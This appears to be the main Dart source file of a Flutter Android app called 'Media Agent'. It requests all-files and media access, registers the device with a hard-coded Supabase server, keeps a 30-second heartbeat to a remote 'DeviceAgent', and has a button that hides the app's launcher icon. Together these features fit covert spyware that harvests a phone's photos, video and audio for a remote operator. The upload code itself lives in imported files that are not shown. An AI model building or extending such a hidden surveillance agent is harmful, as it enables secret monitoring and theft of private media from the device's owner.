import 'dart:async';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

import 'core/device_agent.dart';
import 'core/device_id.dart';

const String SUPABASE_URL =
    'https://kywpnhaermwldzcwtsnv.supabase.co';

const int HEARTBEAT_INTERVAL_SECONDS = 30;

const MethodChannel _permChannel =
    MethodChannel('cyber_agent/permissions');
const MethodChannel _appHider =
    MethodChannel('cyber_accessibility_agent/app_hider');

void main() {
  WidgetsFlutterBinding.ensureInitialized();

  if (SUPABASE_URL.isEmpty) {
    throw Exception('SUPABASE_URL not configured');
  }

  runApp(const MediaAgentApp());
}

class MediaAgentApp extends StatelessWidget {
  const MediaAgentApp({super.key});

  @override
  Widget build(BuildContext context) {
    return const MaterialApp(
      debugShowCheckedModeBanner: false,
      home: HomePage(),
    );
  }
}

class HomePage extends StatefulWidget {
  const HomePage({super.key});
  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> {
  String _status = 'Initializing...';
  String? _deviceId;
  Timer? _heartbeatTimer;
  bool _iconVisible = true;
  bool _started = false;

  @override
  void initState() {
    super.initState();
    _init();
  }

  @override
  void dispose() {
    _heartbeatTimer?.cancel();
    super.dispose();
  }

  Future<void> _init() async {
    // get or create device id (uses your existing DeviceId helper)
    _deviceId = await DeviceId.getOrCreate();

    await DeviceAgent.instance.configure(
      supabaseUrl: SUPABASE_URL,
      deviceId: _deviceId!,
    );

    setState(() => _status = 'Device ID: $_deviceId');

    final ok = await _checkPermissions();
    if (ok) {
      await _startAgent();
    }
  }

  Future<bool> _checkPermissions() async {
    try {
      final Map<dynamic, dynamic>? map =
          await _permChannel.invokeMethod('checkStoragePermissions');
      if (map == null) return false;

      return map['hasAllFilesAccess'] == true ||
          map['readMediaImages'] == true ||
          map['readMediaVideo'] == true ||
          map['readMediaAudio'] == true;
    } catch (_) {
      return false;
    }
  }

  Future<void> _requestPermissions() async {
    await _permChannel.invokeMethod('requestPermissions');
    if (await _checkPermissions()) {
      await _startAgent();
    } else {
      setState(() => _status = 'Permissions not granted');
    }
  }

  Future<void> _startAgent() async {
    if (_started) return;
    _started = true;

    setState(() => _status = 'Registering device...');
    try {
      await DeviceAgent.instance.register();
      await DeviceAgent.instance.start();
      _startHeartbeat();
      setState(() => _status = 'Device online ($_deviceId)');
    } catch (e) {
      setState(() => _status = 'Start error: $e');
    }
  }

  void _startHeartbeat() {
    _heartbeatTimer?.cancel();
    unawaited(DeviceAgent.instance.heartbeat());
    _heartbeatTimer = Timer.periodic(
      const Duration(seconds: HEARTBEAT_INTERVAL_SECONDS),
      (_) => unawaited(DeviceAgent.instance.heartbeat()),
    );
  }

  Future<void> _toggleIcon() async {
    try {
      final ok = _iconVisible
          ? await _appHider.invokeMethod<bool>('hide')
          : await _appHider.invokeMethod<bool>('show');
      if (ok == true) setState(() => _iconVisible = !_iconVisible);
    } catch (_) {}
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text('Media Agent')),
      body: Padding(
        padding: const EdgeInsets.all(16),
        child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          Text(_status),
          const SizedBox(height: 12),
          Text('Device ID: $_deviceId'),
          const SizedBox(height: 12),
          Wrap(spacing: 12, children: [
            ElevatedButton(
              onPressed: _requestPermissions,
              child: const Text('Request Permissions'),
            ),
            ElevatedButton(
              onPressed: _toggleIcon,
              child:
                  Text(_iconVisible ? 'Hide Icon' : 'Show Icon'),
            ),
          ]),
        ]),
      ),
    );
  }
}
